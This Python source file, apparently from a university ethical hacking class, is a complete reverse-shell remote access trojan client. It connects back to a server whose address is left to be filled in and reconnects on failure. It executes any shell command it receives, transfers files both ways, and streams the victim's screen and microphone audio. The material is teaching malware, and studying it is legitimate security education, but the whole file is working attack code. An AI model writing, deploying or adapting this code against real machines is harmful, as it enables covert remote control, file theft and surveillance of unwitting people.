################################################
# Author: Watthanasak Jeamwatthanachai, PhD    #
# Class: SIIT Ethical Hacking, 2023-2024       #
################################################

import socket
import time
import subprocess
import json
import os

import cv2
import numpy as np
import pyautogui
import struct
import mss

import pyaudio
import threading

target_ip = '127.0.0.1' # Replace with server IP address
target_port = 5005
screen_port = 9999
audio_port = 6666
reconnection_delay = 1

# Constants for audio streaming
CHUNK = 1024
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def connection():
    while True:
        time.sleep(reconnection_delay)
        try:
            s.connect((target_ip, target_port))
            shell()
            s.close()
            break
        except:
            connection()

def upload_file(file_name):
    if not os.path.isfile(file_name):
        error_message = f"ERROR: File '{file_name}' not found."
        s.send(error_message.encode())
        return
    
    with open(file_name, 'rb') as f:
        s.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def screen_stream(screen_socket):
    w, h = pyautogui.size()
    monitor = {"top": 0, "left": 0, "width": w, "height": h}

    try:
        with mss.mss() as sct:
            while True:
                screen = sct.grab(monitor)
                frame = np.array(screen)
                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
                message = struct.pack(">L", len(buffer)) + buffer.tobytes()
                try:
                    screen_socket.sendall(message)
                except BrokenPipeError:
                    print("Broken pipe error, connection lost.")
                    break
    except KeyboardInterrupt:
        print("Stopped by user.")
    finally:
        screen_socket.close()

def audio_stream(audio_socket):
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)
    
    try:
        while True:
            data = stream.read(CHUNK, exception_on_overflow=False)
            audio_socket.sendall(data)
    except KeyboardInterrupt:
        print("Stopped by user.")
    finally:
        stream.stop_stream()
        stream.close()
        p.terminate()
        audio_socket.close()

def shell():
    global screen_socket, audio_socket

    while True:
        command = reliable_recv()

        # Common command
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            dir_change = command[3:]
            try:
                os.chdir(dir_change)
                reliable_send({'stdout': os.getcwd(), 'stderr': ''})
            except FileNotFoundError as e:
                reliable_send({'stdout': '', 'stderr': f'cd: no such file or directory: {dir_change}\n'})
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])

        # Screen Streaming
        elif command == 'screen':
            screen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            screen_socket.connect((target_ip, screen_port))
            screen_thread = threading.Thread(target=screen_stream, args=(screen_socket,))
            screen_thread.start()
        elif command == 'audio':
            audio_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            audio_socket.connect((target_ip, audio_port))
            audio_thread = threading.Thread(target=audio_stream, args=(audio_socket,))
            audio_thread.start()
        elif command == 'screenstream':
            screen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            screen_socket.connect((target_ip, screen_port))
            audio_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            audio_socket.connect((target_ip, audio_port))
            screen_thread = threading.Thread(target=screen_stream, args=(screen_socket,))
            audio_thread = threading.Thread(target=audio_stream, args=(audio_socket,))
            screen_thread.start()
            audio_thread.start()

        # Others
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection()
